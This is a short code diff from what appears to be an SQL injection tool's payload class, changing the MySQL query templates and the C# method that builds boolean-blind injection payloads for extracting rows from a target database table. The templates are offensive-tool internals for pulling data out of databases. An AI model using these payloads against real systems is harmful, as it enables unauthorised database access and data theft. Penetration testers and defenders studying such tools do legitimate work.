@@ -63,8 +63,8 @@ namespace SuperSQLInjection.payload
         //获取行数据bool
         public static String data_value = "(select {columns} from `{dbname}`.`{table}` limit {index},1)";
 
-        //获取数据bool,加入orderby解决获取数据时，获取到的数据每一行可能不对称的可能
-        public static String data_value_orderBy = "(select {columns} from `{dbname}`.`{table}` order by {orderby} limit {index},1)";
+        //获取数据bool,加入orderby解决盲注获取数据时，获取到的数据每一行可能不对称的可能
+        public static String bool_data_value = "(select {column} from (select {columns} from `{dbname}`.`{table}` limit {index},1)tmp)";
 
         //union获取数据条数
         public static String data_count = "(select count(*) from `{dbname}`.`{table}`)";
@@ -363,9 +363,9 @@ namespace SuperSQLInjection.payload
 
         }
 
-        public static String getBoolDataPayLoad(String column, String orderBy, String dbName, String table, int index)
+        public static String getBoolDataPayLoad(String column,List<String> columns, String dbName, String table, int index)
         {
-            String data = data_value_orderBy.Replace("{columns}", column).Replace("{orderby}", orderBy).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index + "");
+            String data = bool_data_value.Replace("{column}", column).Replace("{columns}", String.Join(",",columns)).Replace("{dbname}", dbName).Replace("{table}", table).Replace("{index}", index + "");
             return data;
         }
         /// <summary>
